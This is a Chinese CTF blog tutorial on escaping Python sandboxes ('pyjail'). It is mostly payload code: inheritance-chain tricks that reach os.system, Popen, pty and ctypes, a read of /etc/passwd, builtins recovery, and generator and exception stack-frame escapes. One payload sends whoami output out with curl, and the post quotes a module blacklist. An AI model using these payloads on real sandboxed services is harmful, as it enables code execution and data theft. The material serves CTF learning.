<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>沙箱逃逸 | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浅浅记一下无处不在的沙箱逃逸 这个东西还是要搭配例题的嗯嗯 沙箱逃逸从入门到放弃Pyjailmisc手也能学会必须学会的小技巧 先介绍一些不太常规的再介绍常规的吧(密码的现在沙箱哪里还有常规的。。。) 先看一些进行信息收集的函数，信息收集完成后才好确定逃逸方向 神必小帮手dir()dir()可以用于查看可用的内置函数  主要是用来找作为利用点的函数 __dict__一键查属性 m.x等同于m.__">
<meta property="og:type" content="article">
<meta property="og:title" content="沙箱逃逸">
<meta property="og:url" content="https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="Blog of AyaN0">
<meta property="og:description" content="浅浅记一下无处不在的沙箱逃逸 这个东西还是要搭配例题的嗯嗯 沙箱逃逸从入门到放弃Pyjailmisc手也能学会必须学会的小技巧 先介绍一些不太常规的再介绍常规的吧(密码的现在沙箱哪里还有常规的。。。) 先看一些进行信息收集的函数，信息收集完成后才好确定逃逸方向 神必小帮手dir()dir()可以用于查看可用的内置函数  主要是用来找作为利用点的函数 __dict__一键查属性 m.x等同于m.__">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ayan0.top/img/ari.webp">
<meta property="article:published_time" content="2025-05-05T08:13:51.000Z">
<meta property="article:modified_time" content="2025-07-04T11:31:41.983Z">
<meta property="article:author" content="AyaN0">
<meta property="article:tag" content="-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ayan0.top/img/ari.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "沙箱逃逸",
  "url": "https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
  "image": "https://ayan0.top/img/ari.webp",
  "datePublished": "2025-05-05T08:13:51.000Z",
  "dateModified": "2025-07-04T11:31:41.983Z",
  "author": [
    {
      "@type": "Person",
      "name": "AyaN0",
      "url": "https://ayan0.top/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '沙箱逃逸',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">沙箱逃逸</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">沙箱逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-05T08:13:51.000Z" title="发表于 2025-05-05 16:13:51">2025-05-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-04T11:31:41.983Z" title="更新于 2025-07-04 19:31:41">2025-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>浅浅记一下无处不在的沙箱逃逸</p>
<p>这个东西还是要搭配例题的嗯嗯</p>
<h1 id="沙箱逃逸从入门到放弃"><a href="#沙箱逃逸从入门到放弃" class="headerlink" title="沙箱逃逸从入门到放弃"></a>沙箱逃逸从入门到放弃</h1><h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail"></a><code>Pyjail</code></h2><p><code>misc</code>手也能学会<del>必须学会</del>的小技巧</p>
<p>先介绍一些不太常规的再介绍常规的吧(密码的现在沙箱哪里还有常规的。。。)</p>
<p>先看一些进行信息收集的函数，信息收集完成后才好确定逃逸方向</p>
<h3 id="神必小帮手"><a href="#神必小帮手" class="headerlink" title="神必小帮手"></a>神必小帮手</h3><h4 id="dir"><a href="#dir" class="headerlink" title="dir()"></a>dir()</h4><pre><code class="highlight plaintext">dir()可以用于查看可用的内置函数</code></pre>

<p>主要是用来找作为利用点的函数</p>
<h4 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h4><p>一键查属性</p>
<p><code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测</p>
<h4 id="getattr"><a href="#getattr" class="headerlink" title="getattr()"></a><code>getattr()</code></h4><p>看看你的属性呢，可以引入模块来执行命令，有种opcode的即视感(雾)</p>
<pre><code class="highlight plaintext">getattr(__import__(&#x27;os&#x27;),&quot;system&quot;)(&#x27;whoami&#x27;)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png" alt="image-20250703102411030"></p>
<h4 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__"></a><code>__getattribute__</code></h4><p>对象的内置方法，用于在访问对象的任意对象时自动调用</p>
<p>这是一个低级别的钩子，用于拦截属性访问，可以对其进行<code>重载</code>以<code>自定义属性访问行为</code>。</p>
<pre><code class="highlight plaintext">在调用时，一般都是__getattibute__先被调用，当抛出AttributeError 异常时，__getattr__ 才会被调用。
另外，所有的类都会有__getattribute__属性，而不一定有__getattr__属性</code></pre>



<h4 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h4><p><code>__getitem__</code>方法适用于获取元素</p>
<p>当使用<code>obj[key]</code>这样的操作时，python就会自动调用它</p>
<p>这里的key可以是整数索引也可以是其他能当”标签”的键</p>
<p>而你可以用get方法来获得键的值</p>
<h3 id="妙手回春之借刀杀人-self-builtins"><a href="#妙手回春之借刀杀人-self-builtins" class="headerlink" title="妙手回春之借刀杀人(self builtins)"></a>妙手回春之借刀杀人(self builtins)</h3><p>有时沙箱中会用<code>exec</code>限制你的命名空间</p>
<p>因为<code>exec</code>的第二个参数是可以自定义的，通过修改，删除命名空间里的函数就达到了限制你操作的效果，例子来源于 iscc_2016_pycalc</p>
<pre><code class="highlight plaintext">def _hook_import_(name, *args, **kwargs):
    module_blacklist = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;time&#x27;, &#x27;bdb&#x27;, &#x27;bsddb&#x27;, &#x27;cgi&#x27;,
                        &#x27;CGIHTTPServer&#x27;, &#x27;cgitb&#x27;, &#x27;compileall&#x27;, &#x27;ctypes&#x27;, &#x27;dircache&#x27;,
                        &#x27;doctest&#x27;, &#x27;dumbdbm&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;ftplib&#x27;, &#x27;gzip&#x27;,
                        &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;httplib&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;,
                        &#x27;linecache&#x27;, &#x27;macpath&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;,
                        &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;,
                        &#x27;optparse&#x27;, &#x27;pdb&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;,
                        &#x27;posix&#x27;, &#x27;posixfile&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;py_compile&#x27;,
                        &#x27;pyclbr&#x27;, &#x27;pydoc&#x27;, &#x27;rexec&#x27;, &#x27;runpy&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;,
                        &#x27;SimpleXMLRPCServer&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;,
                        &#x27;subprocess&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;,
                        &#x27;tempfile&#x27;, &#x27;Tix&#x27;, &#x27;trace&#x27;, &#x27;turtle&#x27;, &#x27;urllib&#x27;, &#x27;urllib2&#x27;,
                        &#x27;user&#x27;, &#x27;uu&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]
    for forbid in module_blacklist:
        if name == forbid:        # don&#x27;t let user import these modules
            raise RuntimeError(&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__[&#x27;__import__&#x27;] = _hook_import_    # hook import
    del __sandboxed_builtins__[&#x27;open&#x27;]
    _global = &#123;
        &#x27;__builtins__&#x27;: __sandboxed_builtins__
    &#125;

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...</code></pre>

<ol>
<li>沙箱首先获取 <code>__builtins__</code>，然后依据现有的 <code>__builtins__</code> 来构建命名空间。</li>
<li>修改 <code>__import__</code> 函数为自定义的<code>_hook_import_</code></li>
<li>删除 open 函数防止文件操作</li>
<li>exec 命令。</li>
</ol>
<p>绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如 types 库，来执行任意命令：</p>
<pre><code class="highlight plaintext">__import__(&#x27;types&#x27;).__builtins__
__import__(&#x27;string&#x27;).__builtins__</code></pre>

<h3 id="继承链-no-builtins"><a href="#继承链-no-builtins" class="headerlink" title="继承链(no builtins)"></a>继承链(no builtins)</h3><p>什么?<code>builtins</code>被清光了?没事我有继承链</p>
<p>poc原理和SSTI相似，就是利用父类和子类之间的继承关系，不断访问内部属性来达到调用，实现文件读取或者RCE的效果</p>
<p><strong>前提是没有把attribute给你禁掉，禁掉之后这种方法就行不通了</strong></p>
<p>没禁掉的情况基本无敌吧大概</p>
<p><strong>RCE</strong></p>
<pre><code class="highlight plaintext"># os
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)

# subprocess 
[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;Popen&#x27;][0](&#x27;ls&#x27;)

# builtins
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;]

# help
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_GeneratorContextManagerBase&quot; and &quot;os&quot; in x.__init__.__globals__ ][0][&quot;__builtins__&quot;][&#x27;help&#x27;]

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&#x27;__builtins__&#x27;]

#sys
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)

#commands (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;commands&quot; in x.__init__.__globals__ ][0][&quot;commands&quot;].getoutput(&quot;ls&quot;)

#pty (not very common)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pty&quot; in x.__init__.__globals__ ][0][&quot;pty&quot;].spawn(&quot;ls&quot;)

#importlib
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;importlib&quot; in x.__init__.__globals__ ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#imp
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].import_module(&quot;os&quot;).system(&quot;ls&quot;)
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;imp.&quot; in str(x) ][0][&quot;importlib&quot;].__import__(&quot;os&quot;).system(&quot;ls&quot;)

#pdb
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;pdb&quot; in x.__init__.__globals__ ][0][&quot;pdb&quot;].os.system(&quot;ls&quot;)

# ctypes
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())

# multiprocessing
[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;builtins&quot; in x.__init__.__globals__ ][0][&quot;builtins&quot;].__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</code></pre>

<p><strong>File</strong></p>
<pre><code class="highlight plaintext">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</code></pre>



<h3 id="栈帧逃逸"><a href="#栈帧逃逸" class="headerlink" title="栈帧逃逸"></a>栈帧逃逸</h3><p>先了解一些概念吧。</p>
<p><strong>栈帧</strong></p>
<p><strong>生成器</strong></p>
<p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p>
<p>在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">f</span>():
    a=<span class="number">1</span>
    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">yield</span> a
        a+=<span class="number">1</span>
f=f()
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#1</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#2</span>
<span class="built_in">print</span>(<span class="built_in">next</span>(f)) <span class="comment">#3</span>
<span class="built_in">next</span>() 函数在Python中用于获取迭代器的下一个元素

<span class="comment">#生成器表达式:</span>
 gen_exp = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>))

 <span class="keyword">for</span> num <span class="keyword">in</span> gen_exp:
     <span class="built_in">print</span>(num)
<span class="comment">#类似于列表推导式，但使用小括号 () 而不是方括号 [] 来创建生成器表达式</span></code></pre>

<p><strong>生成器属性</strong></p>
<p><code>gi_code</code>: 生成器对应的code对象。<br><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
<p><strong>着重介绍一下 gi_frame 属性</strong><br><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。</p>
<p>下面是一个简单的示例，演示了如何使用生成器的 gi_frame 属性来获取生成器的当前帧信息:</p>
<pre><code class="highlight python"><span class="keyword">def</span> <span class="title function_">my_generator</span>():
    <span class="keyword">yield</span> <span class="number">1</span>
    <span class="keyword">yield</span> <span class="number">2</span>
    <span class="keyword">yield</span> <span class="number">3</span>

gen = my_generator()

<span class="comment"># 获取生成器的当前帧信息</span>
frame = gen.gi_frame

<span class="comment"># 输出生成器的当前帧信息</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)
<span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)
<span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)
<span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre>

<p><strong>栈帧(frame)</strong></p>
<p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
<p>栈帧包含了以下几个重要的属性：<br><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈</p>
<h4 id="生成器栈帧逃逸"><a href="#生成器栈帧逃逸" class="headerlink" title="生成器栈帧逃逸"></a><strong>生成器栈帧逃逸</strong></h4><p>原理其实就是生成器的栈帧对象通过<code>f_back</code>不断返回前一帧从而去获取<code>globals</code>全局符号表</p>
<pre><code class="highlight python">s3cret=<span class="string">&quot;this is flag&quot;</span>
<span class="keyword">def</span> <span class="title function_">f</span>():
        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back

g = f().gi_frame  <span class="comment">#生成器</span>
<span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, g.f_globals)</code></pre>

<p>在这里其实就可以看到成功逃出</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102803052.png" alt="image-20250506102803052"></p>
<p>而查看locals时就会发现是空列表</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250506102848722.png" alt="image-20250506102848722"></p>
<p>模拟一下沙箱的操作</p>
<pre><code class="highlight python">codes=<span class="string">&#x27;&#x27;&#x27;</span>
<span class="string">def waff():</span>
<span class="string">    def f():</span>
<span class="string">        yield g.gi_frame.f_back</span>
<span class="string"></span>
<span class="string">    g = f()  #生成器</span>
<span class="string">    frame = next(g) #获取到生成器的栈帧对象</span>
<span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span>
<span class="string">    return b</span>
<span class="string">b=waff()</span>
<span class="string">&#x27;&#x27;&#x27;</span>
<span class="built_in">locals</span>=&#123;&#125;
code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)
<span class="built_in">exec</span>(code,<span class="built_in">locals</span>)
<span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])
<span class="comment">#使用next获取到的就是yield定义的值，这里获取到的就是g.gi_frame.f_back</span>
<span class="comment">#使用g.gi_frame.f_back的话，那么g = f()就必须为g，用的就是这个生成器对象的栈帧</span>
<span class="comment">#compile(codes, &quot;test&quot;, &quot;exec&quot;)就是设置了名称为test的python沙箱环境</span></code></pre>

<p>运行得到 <code>this is flag</code> ,成功逃逸出沙箱获取到<code>s3cret</code>变量值</p>
<p>这里也可以使用<code>f_locals</code>去代替<code>f_globals</code>效果是相同的，但是要注意，<code>locals</code>返回的是局部符号表，它包含了在当前函数或方法内部定义的变量。这些局部变量只在当前函数或方法的执行过程中存在，并且只能在该函数或方法内部访问。当函数执行完毕后，这些局部变量就会被销毁。</p>
<p>怎么用呢，可以用来配合修改函数；也可以拿<code>_globals</code>反打rce</p>
<pre><code class="highlight plaintext">2024L3HCTF 打int函数返回值 参考链接:https://xz.aliyun.com/news/13075</code></pre>

<h4 id="异常栈帧逃逸"><a href="#异常栈帧逃逸" class="headerlink" title="异常栈帧逃逸"></a><strong>异常栈帧逃逸</strong></h4><p>通过主动抛出异常+抓抛出错误的栈帧来逃逸沙箱</p>
<p>给一串简单的实例:</p>
<pre><code class="highlight python"><span class="keyword">try</span>:
    <span class="number">1</span>/<span class="number">0</span>
<span class="keyword">except</span> Exception <span class="keyword">as</span> e:
    frame=e.__traceback__.tb_frame
    builtins=frame.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]
